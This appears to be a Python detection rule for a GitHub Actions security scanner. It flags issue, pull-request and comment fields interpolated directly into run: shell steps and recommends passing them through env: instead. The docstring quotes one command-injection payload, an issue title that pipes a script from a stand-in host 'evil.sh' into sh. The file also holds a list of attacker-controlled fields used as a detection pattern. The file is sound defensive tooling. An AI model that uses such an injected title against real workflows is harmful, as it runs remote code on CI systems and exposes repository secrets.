"""AGMCP-102: attacker-controlled ${{ }} context interpolated directly
into a `run:` shell step. An issue title of `"; curl evil.sh | sh #` is
not a string once the workflow file drops it straight into `run:` — it's
shell. The fix (passed through `env:` instead) is intentionally not
flagged: the shell never re-parses an environment variable expansion the
way it re-parses inline template substitution.

Matching normalizes bracket notation (`github.event['issue']['title']`)
to the dot form and lowercases before comparing, so both of GitHub
Actions' equivalent spellings of the same marker are caught the same
way — see `parser.normalize_expression`.

Known limitations: (1) this only reads the literal expression text
inside `run:` — a value laundered through a step output or an `env:`
variable first is invisible to it, since there's no data-flow tracking
across steps; (2) the marker list is a finite, hand-maintained set of
known attacker-controlled fields, not a real expression-language parser,
so a new/uncommon context path can exist that isn't listed here yet.
Treat a clean scan as "no *listed* attacker-controlled interpolation
found in a `run:` step directly", not a guarantee.
"""

from __future__ import annotations

from ..models import Finding
from ..parser import iter_run_expressions, normalize_expression

RULE_ID = "AGMCP-102"

# Every one of these ultimately comes from content an outside, potentially
# malicious actor supplies (an issue/PR title or body, a comment, a review,
# a branch name, a commit message) — not from the repository owner's own
# configuration.
_ATTACKER_CONTROLLED_MARKERS = (
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.repo.full_name",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.event.head_commit.message",
    "github.event.workflow_run.head_branch",
    "github.event.release.name",
    "github.event.release.body",
    "github.head_ref",
    # toJSON(github.event) dumps the entire event payload — including
    # every field above — into one string. It's at least as dangerous as
    # any single flagged field, so it's its own marker rather than
    # something this rule would otherwise miss entirely.
    "tojson(github.event",
)


def check(workflow: dict, triggers: set[str]) -> list[Finding]:
    findings: list[Finding] = []
    for job_id, idx, expr in iter_run_expressions(workflow):
        expr_lower = normalize_expression(expr).lower()
        marker = next((m for m in _ATTACKER_CONTROLLED_MARKERS if m in expr_lower), None)
        if marker is None:
            continue
        findings.append(
            Finding(
                rule_id=RULE_ID,
                severity="critical",
                message=(
                    f"`${{{{ {expr} }}}}` is attacker-controlled content interpolated directly "
                    "into a shell command. Pass it through `env:` instead and reference the "
                    "environment variable in `run:` — the shell only expands the variable then, "
                    "it never re-parses the raw value as a template."
                ),
                location=f"jobs.{job_id}.steps[{idx}].run",
            )
        )
    return findings
